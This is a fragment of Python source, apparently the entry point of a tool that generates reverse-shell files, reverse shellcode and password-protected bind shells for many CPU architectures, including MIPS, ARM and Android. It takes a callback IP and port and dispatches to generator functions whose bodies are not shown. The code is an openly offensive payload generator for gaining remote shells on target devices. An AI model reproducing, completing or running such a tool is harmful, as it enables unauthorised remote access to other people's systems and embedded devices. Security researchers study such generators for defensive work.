...
def num_getreverse_file(number, reverse_ip, reverse_port):
...
def num_getbind_shell(number, listen_port, passwd):

	fun = bind_shell_dic.get(number)
	return fun(listen_port, passwd)

def main():
	parser = argparse.ArgumentParser()
	parser.add_argument('-reverse_ip', required=True, type=str, default=None, help='reverse_ip set')
	parser.add_argument('-reverse_port', required=True, type=int, help='reverse_port set')
	parser.add_argument('-arch', required=True, type=str, help='Target arch architecturet', choices=('mips','mipsel','mips64','mipsel64','armelv5','armelv7','armebv5','armebv7','aarch64','x86','x64','aarch64','android'))
	parser.add_argument('-res', required=True, type=str,default="reverse_shell_file", choices=('reverse_shell_file', 'reverse_shellcode', 'bind_shell'))
	parser.add_argument('-passwd', required=False, type=str,default=None)
	args = parser.parse_args()
	if (args.res == "reverse_shell_file"):
		try:
			num_getreverse_file(arch_get_number(args.arch), args.reverse_ip, args.reverse_port)
		except Exception as e:
		#	print(e)
			log.info("The function is still under development. Please wait")

	if (args.res == "reverse_shellcode"):
		try:
	...
	if (args.res == "bind_shell"):
		try:
			if (args.passwd==None):
				log.error("please set bind passwd")
				return
			num_getbind_shell(arch_get_number(args.arch), args.reverse_port, args.passwd)
		except Exception as e:
			#print(e)
			pass
